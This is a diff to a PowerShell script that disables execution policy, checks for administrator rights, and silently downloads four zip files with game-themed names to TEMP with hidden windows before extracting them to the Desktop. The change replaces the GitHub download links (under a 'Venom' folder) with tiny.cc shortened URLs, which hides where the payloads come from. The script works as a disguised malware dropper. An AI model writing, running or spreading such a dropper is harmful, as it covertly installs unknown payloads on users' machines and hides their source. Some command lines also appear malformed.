@@ -15,10 +15,10 @@ Set-ExecutionPolicy Unrestricted -Force
 
 Set-Variable -Name textPath -Value ("$env:TEMP")
 Set-Variable -Name zipFilePath -Value ("$env:TEMP")
-Set-Variable -Name zipUrl -Value ("https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip")
-Set-Variable -Name zipUrl_1 -Value ("https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/Fifa-Ps5.zip")
-Set-Variable -Name zipUrl_2 -Value ("https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/Gta5-Ps5.zip")
-Set-Variable -Name zipUrl_3 -Value ("https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/dumdum.zip")
+Set-Variable -Name zipUrl -Value ("http://tiny.cc/f7cg001")
+Set-Variable -Name zipUrl_1 -Value ("http://tiny.cc/k7cg001")
+Set-Variable -Name zipUrl_2 -Value ("http://tiny.cc/p7cg001")
+Set-Variable -Name zipUrl_3 -Value ("http://tiny.cc/v7cg001")
 Set-Variable -Name desktopPath -Value ([Environment]::GetFolderPath("Desktop"))
 function Test-IsAdmin {
     Set-Variable -Name currentUser -Value (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()))
@@ -33,13 +33,13 @@ if (-not (Test-IsAdmin)) {
 
 Set-Content -Value "Permissions Granted" -Path "$textPath\perm.txt"
 
-powershell -windowstyle hidden Invoke-WebRequest -OutFile "$zipFilePath\AssassinsCreed_SE.zip" -Uri $zipUrl
+powershell -windowstyle hidden Invoke-WebRequest -UseBasicParsing -OutFile "$zipFilePath\AssassinsCreed_SE.zip" -Uri $zipUrl
 
-powershell -Uri $zipUrl_1 Invoke-WebRequest -windowstyle hidden -OutFile "$zipFilePath\Fifa-Ps5.zip"
+powershell -Uri $zipUrl_1 Invoke-WebRequest -windowstyle hidden -UseBasicParsing -OutFile "$zipFilePath\Fifa-Ps5.zip"
 
-powershell -Uri $zipUrl_2 Invoke-WebRequest -OutFile "$zipFilePath\Gta5-Ps5.zip" -windowstyle hidden
+powershell -Uri $zipUrl_2 Invoke-WebRequest -UseBasicParsing -OutFile "$zipFilePath\Gta5-Ps5.zip" -windowstyle hidden
 
-powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl_3 -OutFile "$zipFilePath\dumdum.zip"
+powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl_3 -UseBasicParsing -OutFile "$zipFilePath\dumdum.zip"
 
 Expand-Archive -Force -Path "$zipFilePath\AssassinsCreed_SE.zip" -DestinationPath $desktopPath
 
